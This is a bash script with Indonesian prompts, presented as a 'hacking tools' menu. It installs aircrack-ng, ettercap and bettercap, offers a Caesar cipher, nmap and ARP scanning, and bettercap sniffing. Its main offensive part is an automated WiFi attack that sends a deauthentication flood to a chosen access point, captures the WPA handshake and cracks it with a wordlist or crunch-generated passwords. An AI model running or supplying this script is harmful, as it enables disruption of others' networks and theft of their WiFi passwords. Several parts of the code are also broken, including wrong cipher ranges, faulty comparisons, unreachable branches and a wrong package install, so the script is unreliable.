#!/bin/bash
clear


RED='\e[31m'
GREEN='\e[92m'
YELLOW='\e[33m'
ORANGE='\e[93m'
BLUE='\e[34m'

WHITE='\e[37m'


green='\e[0;32m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[1;33m'
blue='\e[1;34m'
Escape="\033";
white="${Escape}[0m";
RedF="${Escape}[31m";
GreenF="${Escape}[32m";
LighGreenF="${Escape}[92m"
YellowF="${Escape}[33m";
BlueF="${Escape}[34m";
echo -e "${blue} "
echo "          +-------------------------------------------------------+"
echo -e "${YELLOW} "
echo "                    __ ___  ___         ___   ___ ___              "
echo "                   |  ||    |  | |   |   |   |  | |      |         "
echo "                   |__||__  |__| |   |   |   |__| |__  __|         "
echo "                   | \ |       | |   |   |   | \  |   |  |         "
echo "                   |  \|__     | |___|  _|_  |  \ |__ |__|         "
echo -e "${blue} "
echo "                                                                   "
echo "                          TUNGGU INSTALLISASI PACKAGE              "
echo "                                                  sabar cok        "
echo -e "${blue} "
echo "          +-------------------------------------------------------+"
echo -e "${WHITE} "
echo ""
which aircrack-ng > /dev/null 2>&1
	if [ "$?" -eq "0" ]; then
		echo -e $green "              [ ✔ ] aircrack-ng ..............${LighGreenF}[ Ditemukan ]"
		which aircrack-ng > /dev/null 2>&1
	sleep 2
		else
			echo -e $red "[ X ] aircrack-ng  -> ${RedF}not found "
		echo -e $yellow "[ ! ] install aircrack-ng "
			sudo apt-get install aircrack-ng
			echo -e $blue "[ ✔ ] sukses installing ...."
		which aircrack-ng > /dev/null 2>&1
	sleep 2
fi

which airodump-ng > /dev/null 2>&1
	if [ "$?" -eq "0" ]; then
		echo -e $green "              [ ✔ ] airodump-ng ..............${LighGreenF}[ Ditemukan ]"
			which airodump-ng > /dev/null 2>&1
		sleep 2
	else
		echo -e $red "[ X ] airodump-ng  -> ${RedF}not found "
		echo -e $yellow "[ ! ] install airodump-ng "
			sudo apt-get install airodump-ng
		echo -e $blue "[ ✔ ] sukses installing ...."
			which airodump-ng > /dev/null 2>&1
	sleep 2
fi

which aireplay-ng > /dev/null 2>&1
	if [ "$?" -eq "0" ]; then
		echo -e $green "              [ ✔ ] aireplay-ng ..............${LighGreenF}[ Ditemukan ]"
		which aireplay-ng > /dev/null 2>&1
	sleep 2
else
		echo -e $red "[ X ] aireplay-ng  -> ${RedF}not found "
		echo -e $yellow "[ ! ] install aireplay-ng "
		sudo apt-get install aireplay-ng
		echo -e $blue "[ ✔ ] sukses installing ...."
which aireplay-ng > /dev/null 2>&1
	sleep 2
fi

which crunch > /dev/null 2>&1
	if [ "$?" -eq "0" ]; then
		echo -e $green "              [ ✔ ] crunch ...................${LighGreenF}[ Ditemukan ]"
		which crunch > /dev/null 2>&1
		sleep 2
	else
		echo -e $red "[ X ] crunch  -> ${RedF}not found "
		echo -e $yellow "[ ! ] install crunch "
		sudo apt-get install crunch
		echo -e $blue "[ ✔ ] sukses installing ...."
	which crunch > /dev/null 2>&1
		sleep 2
	fi
which xterm > /dev/null 2>&1
	if [ "$?" -eq "0" ]; then
		echo -e $green "              [ ✔ ] xterm ....................${LighGreenF}[ Ditemukan ]"
			which crunch > /dev/null 2>&1
		sleep 2
	else
		echo -e $red "[ X ] xterm  -> ${RedF}not found "
		echo -e $yellow "[ ! ] install xterm "
		sudo apt-get install xterm
		echo -e $blue "[ ✔ ] sukses installing ...."
	which xterm > /dev/null 2>&1
sleep 2
fi
which nmap > /dev/null 2>&1
	if [ "$?" -eq "0" ]; then
		echo -e $green "              [ ✔ ] nmap .....................${LighGreenF}[ Ditemukan ]"
	which nmap > /dev/null 2>&1
		sleep 2
	else
		echo -e $red "[ X ] Nmap  -> ${RedF}not found "
		echo -e $yellow "[ ! ] install Nmap "
		sudo apt-get install nmap
		echo -e $blue "[ ✔ ] sukses installing ...."
	which nmap > /dev/null 2>&1
   sleep 2
fi

which ettercap > /dev/null 2>&1
	if [ "$?" -eq "0" ]; then
		echo -e $green "              [ ✔ ] ettercap .................${LighGreenF}[ Ditemukan ]"
	which ettercap > /dev/null 2>&1
		sleep 2
	else
		echo -e $red "[ X ] ettercap  -> ${RedF}not found "
		echo -e $yellow "[ ! ] install ettercap "
		sudo apt-get install ettercap-graphical
		echo -e $blue "[ ✔ ] sukses installing ...."
		which ettercap > /dev/null 2>&1
	sleep 2
fi

which bettercap > /dev/null 2>&1
	if [ "$?" -eq "0" ]; then
		echo -e $green "              [ ✔ ] bettercap ................${LighGreenF}[ Ditemukan ]"
	which bettercap > /dev/null 2>&1
	sleep 2
else
		echo -e $red "[ X ] ettercap  -> ${RedF}not found "
		echo -e $yellow "[ ! ] install bettercap "
		sudo apt-get install bettercap
		echo -e $blue "[ ✔ ] sukses installing ...."
	which bettercap > /dev/null 2>&1
    sleep 2
fi

which driftnet > /dev/null 2>&1
	if [ "$?" -eq "0" ]; then
		echo -e $green "              [ ✔ ] driftnet .................${LighGreenF}[ Ditemukan ]"
		which driftnet > /dev/null 2>&1
	sleep 2
	else
		echo -e $red "[ X ] driftnet  -> ${RedF}not found "
		echo -e $yellow "[ ! ] install driftnet "
		sudo apt-get install driftnet
		echo -e $blue "[ ✔ ] sukses installing ...."
	which driftnet > /dev/null 2>&1
   sleep 2
fi
which arp-scan > /dev/null 2>&1
	if [ "$?" -eq "0" ]; then
		echo -e $green "              [ ✔ ] arp-scan .................${LighGreenF}[ Ditemukan ]"
	which arp-scan > /dev/null 2>&1
   sleep 2
else
	echo -e $red "[ X ] arp-scan  -> ${RedF}not found "
	echo -e $yellow "[ ! ] install arp-scan "
	sudo apt-get install driftnet
	echo -e $blue "[ ✔ ] sukses installing ...."
	which arp-scan > /dev/null 2>&1
    sleep 2
fi
for ((i=0;i<1;i++)); do
   printf "\r                _ [tunggu].."
   	sleep 0.2
   printf "\r               /  [tunggu]..."
   	sleep 0.2
   printf "\r               -- [tunggu]...." 
   	sleep 0.2
   printf "\r               \  [tunggu]......."
   	sleep 0.2
   printf "\r                | [tunggu].. ...... "
   	sleep 0.2
   printf "\r               )  [tunggu]............"
   	sleep 0.2
   printf "\r               /  [tunggu].............."
   	sleep 0.2
   printf "\r               _  [tunggu]................"
   	sleep 0.2
   printf "\r               (  [tunggu].................."
   	sleep 0.2
   printf "\r               /  [tunggu]...................." 
   	sleep 0.2
   printf "\r               -- [tunggu]......................"
   	sleep 0.2
   printf "\r                \ [tunggu].. ...................... "
   	sleep 0.2
   printf "\r                ) [tunggu]..........................."
   	sleep 0.2
   printf "\r                _ [tunggu].............................. [100]"
   	sleep 0.4
   done
sleep 1
clear
echo -e "${lightgreen} "
echo "          +======================================================+"
echo "          + N    N 0000   SSSS Y   Y SSSSS TTTTTTT EEEEE MM   MM +"
echo "          + N N  N 0  0   S     Y Y  S        T    E     M M M M +"
echo "          + N  N N 0  0   SSSS   Y   SSSSS    T    EEEEE M  M  M +"
echo "          + N   NN 0  0      S   Y       S    T    E     M     M +"
echo "          + N    N 0000   SSSS   Y   SSSSS    T    EEEEE M     M +"
echo "          +                                                      +"
echo "          +                      I  SSSS                         +"
echo "          +                      I  S                            +"
echo "          +                      I  SSSS                         +"
echo "          +                      I     S                         +"
echo "          +                      I  SSSS                         +"
echo "          +                                                      +"
echo "          +          SSSSS    A     FFFFF EEEEE                  +"
echo "          +          S        A     F     E                      +"
echo "          +          SSSSS   A A    FFFFF EEEEE                  +"
echo "          +              S  AAAAA   F     E                      +"
echo "          +          SSSSS A     A  F     EEEEE                  +"
echo "          +                                                      +"
echo "          +              BY Tony Tools v2                        +"
echo "          +                                                      +"
echo "          +######################################################+"

echo -e "${BLUE}"
echo ""
echo "             1. Kriptografi"
echo "             2. Sniffing/Spoofing"
echo "             3. Brute Force Web(Masih dikembangkan)"
echo "             4. Wifi Hack"
echo "             5. Exploitation (Masih dikembangkan)"
echo "             6. Bypass Malware(Masih dikembangkan)"
echo "#################################################"
echo -e "${WHITE}"
echo ""
echo "Pilih Angka Diatas :"
read pilih

case $pilih in

1)
echo "kriptografi sedang berjalan ........."
echo "              a. Caesar Chiper"
echo "              b. Vigenere"
echo " Pilih : "
read jenis

if [[ $jenis -eq 'a' ]]
	then
		echo "masukan jumlah key :"
		read key
		echo "masukan plain text Huruf Besar :"
	read text
		if [[ $key -eq 1 ]]
		then
			echo "========================================="
			echo "Sebelum : $text"
			echo "sesudah : $text" | tr '[A-Z]' '[B-ZA-W]'
			echo "========================================="
		elif [[ $key -eq 2 ]]
			then
				echo "========================================="
				echo "Sebelum : $text"
				echo "sesudah : $text" | tr '[A-Z]' '[C-ZA-W]'
				echo "========================================="

		elif [[ $key -eq 3 ]]
			then
				echo "========================================="
				echo "Sebelum : $text"
				echo "sesudah : $text" | tr '[A-Z]' '[D-ZA-W]'
				echo "========================================="
		elif [[ $key -eq 4 ]]
		then
			echo "========================================="
			echo "Sebelum : $text"
			echo "sesudah : $text" | tr '[A-Z]' '[E-ZA-W]'
			echo "========================================="

		elif [[ $key -eq 5 ]]
			then
				echo "========================================="
				echo "Sebelum : $text"
				echo "sesudah : $text" | tr '[A-Z]' '[F-ZA-W]'
				echo "========================================="
		elif [[ $key -eq 6 ]]
				then
					echo "========================================="
					echo "Sebelum : $text"
					echo "sesudah : $text" | tr '[A-Z]' '[G-ZA-W]'
					echo "========================================="

		elif [[ $key -eq 7 ]]
				then
					echo "========================================="
					echo "Sebelum : $text"
					echo "sesudah : $text" | tr '[A-Z]' '[H-ZA-W]'
					echo "========================================="
		elif [[ $key -eq 8 ]]
			then
				echo "========================================="
				echo "Sebelum : $text"
				echo "sesudah : $text" | tr '[A-Z]' '[I-ZA-W]'
				echo "========================================="

		elif [[ $key -eq 9 ]]
			then
				echo "========================================="
				echo "Sebelum : $text"
				echo "sesudah : $text" | tr '[A-Z]' '[J-ZA-W]'
				echo "========================================="

		elif [[ $key -eq 10 ]]
			then
				echo "========================================="
				echo "Sebelum : $text"
				echo "sesudah : $text" | tr '[A-Z]' '[K-ZA-W]'
				echo "========================================="

		elif [[ $key -eq 11 ]]
			then
				echo "========================================="
				echo "Sebelum : $text"
				echo "sesudah : $text" | tr '[A-Z]' '[L-ZA-W]'
				echo "========================================="
		elif [[ $key -eq 12 ]]
			then
				echo "========================================="
				echo "Sebelum : $text"
				echo "sesudah : $text" | tr '[A-Z]' '[M-ZA-W]'
				echo "========================================="
		elif [[ $key -eq 13 ]]
			then
				echo "========================================="
				echo "Sebelum : $text"
				echo "sesudah : $text" | tr '[A-Z]' '[N-ZA-W]'
				echo "========================================="
		else
			echo "asu"
		fi

	else
		echo "Gagal"
	fi
 exit
	if [[ $jenis -eq 'b' ]]
		then
			echo "Vigenere Key :"
				read keyvig
				echo "Plain Text Vigenere"
				read plvg
				echo "========================================="
				echo "        vigenere sebelum : $plvg"
				echo "        vigenere sesudah : "
	else
		echo "gagal"
	fi
;;
##############################################################################
2)

function keluar(){
	exit
}

function fungsidua(){

	echo "=============================================="
	echo "   IP Scanning | Port Scanning | Sniffing     "
	echo "=============================================="
	echo ""
	echo ""
	echo "1. IP Scanning    "
	echo "2. Port Scanning Nmap  "
	echo "3. Sniffing Target"
	read pilih
	
	if [ $pilih == 1 ]; then
		echo "===================================="
		arp-scan -l
		echo ""
		echo ""
		echo "===================================="
	fungsidua

	elif [ $pilih == 2 ]; then
		echo "===================================="
		echo ""
		echo "IP target : "
		read iptarget
		nmap -O -sV $iptarget
		echo "===================================="
		echo ""
		echo "back(y)/exit(e) : "
		read yx
			if [[ $yx -eq 'y' ]]
			then
				fungsidua
			elif [[ $yx -eq 'e' ]]
			then
				exit
				keluar
			else
			echo ""
			fi
	
	elif [ $pilih == 3 ]; then
		bettercap
	else
	exit
	fi	
}
fungsidua
;;
##############################################################################
3)
;;
##############################################################################
4)
echo ""
for ((i=0;i<1;i++)); do
   printf "\r  _ [tunggu]...."
   sleep 0.2
   printf "\r /  [tunggu]........"
   sleep 0.3
   printf "\r -- [tunggu]..........." 
   sleep 0.4
   printf "\r \  [tunggu]..............."
   sleep 0.5
   printf "\r  | [tunggu].................. "
   printf 0.7
   printf "\r /  [tunggu]........................"
   sleep 0.8
   printf "\r /  [tunggu].............................. [100]"
   sleep 1
done
sleep 1
clear
echo -e "${YELLOW} "
echo "                    ++++++++++++++++++++++++++++++++#"
echo "                    #                               #"
echo "                    #  w     w       w  i FFFFFF  I #"
echo "                    #   w   w  w    w   i F       I #"
echo "                    #    w w     w w    i FFFFFF  I #"
echo "                    #     w       w     i F       I #"
echo "                    #     w       w     i F       I #"
echo "                    #   wifi v2.1 hacking tools     #"
echo "                    #         Automatic             #"
echo "                    +++++++++++++++++++++++++++++++++"
echo -e "${WHITE} "
echo "        ---------------------------------------------------------"
echo "masukan interface kamu wlo/wlan0 : "
read interfc
airmon-ng start $interfc
airmon-ng check kill

echo "Monitoring Interface yang sama wlan0/wlo1 : "
read monit
airodump-ng $monit

echo "enter BSSID Target :"
read bssid
echo "Channel Target     :"
read channel
echo "Target ESSID :"
read name

echo "==========================================="
echo "Target BSSID   : $bssid"
echo "Target Channel : $channel"
echo "==========================================="

xterm -hold -e "airodump-ng --bssid $bssid --channel $channel --write cap $monit" &
sleep 2
clear
client=FF:FF:FF:FF:FF:FF
#airodump-ng --ig -w cap -c $chnl --bssid $bssid $mon & sleep 6 &&
xterm -hold -e "aireplay-ng --deauth 100 -a $bssid $monit" &
sleep 2
clear

echo "============================================"
echo "1. Brute Force Default"
echo "2. Wordlist with crunch"
echo "pilih : "
read wordlists
for ((i=0;i<1;i++)); do
   printf "\r  _ tunggu.... "
   sleep 0.2
   printf "\r /  tunggu........"
   sleep 0.3
   printf "\r -  tunggu..........." 
   sleep 0.4
   printf "\r \  tunggu..............."
   sleep 0.5
   printf "\r  | tunggu.................. "
   sleep 0.7
   printf "\r /  tunggu.................... 100"
   sleep 0.9

done
if [ $wordlists == "1" ]; then
   echo "pilih folder file : "
   read file
   aircrack-ng -w $file ./cap-01.cap
else
   echo "pilih karakter misal (abcde1234565) :"
   read karakter
   echo "pilih min password (Default 8) :" 
   read min
   echo "pilih max password (Default 8) :"
   read max
   crunch $min $max $karakter | aircrack-ng -e $name  -w- ./cap-01.cap
fi
echo Waiting for Shutdown........
airmon-ng stop $interfc
echo Deleting Handshake Files.......
rm cap*
echo finist!
;;
esac
